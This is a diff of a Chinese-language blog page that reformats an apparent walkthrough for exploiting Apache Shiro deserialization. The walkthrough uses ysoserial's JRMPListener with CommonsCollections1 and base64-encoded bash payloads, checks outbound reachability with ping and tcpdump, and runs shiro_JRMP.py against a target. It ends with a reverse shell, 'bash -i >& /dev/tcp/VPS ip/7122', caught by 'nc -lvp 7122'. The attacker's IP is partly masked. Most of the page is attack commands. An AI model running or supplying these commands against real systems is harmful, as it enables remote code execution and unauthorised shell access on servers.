@@ -23,7 +23,7 @@
 <meta property="og:image" content="https:&#x2F;&#x2F;conanstudio-1300441002.cos.ap-chengdu.myqcloud.com&#x2F;shiro%E5%8F%8D%E5%BC%B9shell&#x2F;6.png">
 <meta property="og:image" content="https:&#x2F;&#x2F;conanstudio-1300441002.cos.ap-chengdu.myqcloud.com&#x2F;shiro%E5%8F%8D%E5%BC%B9shell&#x2F;7.png">
 <meta property="og:image" content="https:&#x2F;&#x2F;conanstudio-1300441002.cos.ap-chengdu.myqcloud.com&#x2F;shiro%E5%8F%8D%E5%BC%B9shell&#x2F;8.png">
-<meta property="og:updated_time" content="2020-02-10T02:40:59.276Z">
+<meta property="og:updated_time" content="2020-02-10T03:05:07.801Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https:&#x2F;&#x2F;conanstudio-1300441002.cos.ap-chengdu.myqcloud.com&#x2F;shiro%E5%8F%8D%E5%BC%B9shell&#x2F;1.png">
   
@@ -191,12 +191,19 @@
 <p>首先使用vps安装java 上传ysoserial-master.jar</p>
 <p>接下来将需要执行的命令转换为base64</p>
 <p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/shiro%E5%8F%8D%E5%BC%B9shell/1.png" alt="img"></p>
-<p>java -cp ysoserial-master.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 ‘bash -c {echo,cGluZyAxMxxxxxxxxxxxC4xNTM=}|{base64,-d}|{bash,-i}’</p>
+<ul>
+<li>java -cp ysoserial-master.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 ‘bash -c {echo,cGluZyAxMxxxxxxxxxxxC4xNTM=}|{base64,-d}|{bash,-i}’</li>
+</ul>
 <p>JRMP监听1099端口</p>
-<p>开新窗口 启动 tcpdump -i eth0 icmp 抓ping包</p>
+<p>开新窗口 启动：</p>
+<ul>
+<li>tcpdump -i eth0 icmp 抓ping包</li>
+</ul>
 <p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/shiro%E5%8F%8D%E5%BC%B9shell/2.png" alt="img"></p>
 <p>使用脚本执行</p>
-<p>python2 shiro_JRMP.py vps服务器ip:1099</p>
+<ul>
+<li>python2 shiro_JRMP.py vps服务器ip:1099</li>
+</ul>
 <p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/shiro%E5%8F%8D%E5%BC%B9shell/3.png" alt="img"></p>
 <p>抓登录包</p>
 <p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/shiro%E5%8F%8D%E5%BC%B9shell/4.png" alt="img"></p>
@@ -204,13 +211,19 @@
 <p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/shiro%E5%8F%8D%E5%BC%B9shell/5.png" alt="img"></p>
 <p>判断该ip可出网</p>
 <p>接下来反弹shell</p>
-<p>bash -i &gt;&amp; /dev/tcp/VPS服务器ip/7122 0&gt;&amp;1 </p>
+<ul>
+<li>bash -i &gt;&amp; /dev/tcp/VPS服务器ip/7122 0&gt;&amp;1 </li>
+</ul>
 <p>base64编码</p>
-<p>java -cp ysoserial-master.jar ysoserial.eloit.JRMPListener 1099 CommonsCollections1 ‘bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xxxxxxxxxxMC4xNTMvNzEyMiAwPiYx}|{base64,-d}|{bash,-i}’</p>
+<ul>
+<li>java -cp ysoserial-master.jar ysoserial.eloit.JRMPListener 1099 CommonsCollections1 ‘bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xxxxxxxxxxMC4xNTMvNzEyMiAwPiYx}|{base64,-d}|{bash,-i}’</li>
+</ul>
 <p>执行java</p>
 <p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/shiro%E5%8F%8D%E5%BC%B9shell/6.png" alt="img"></p>
 <p>nc监听7122端口</p>
-<p>nc -lvp 7122 </p>
+<ul>
+<li>nc -lvp 7122 </li>
+</ul>
 <p>抓包发包</p>
 <p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/shiro%E5%8F%8D%E5%BC%B9shell/7.png" alt="img"></p>
 <p>shell弹回来了</p>
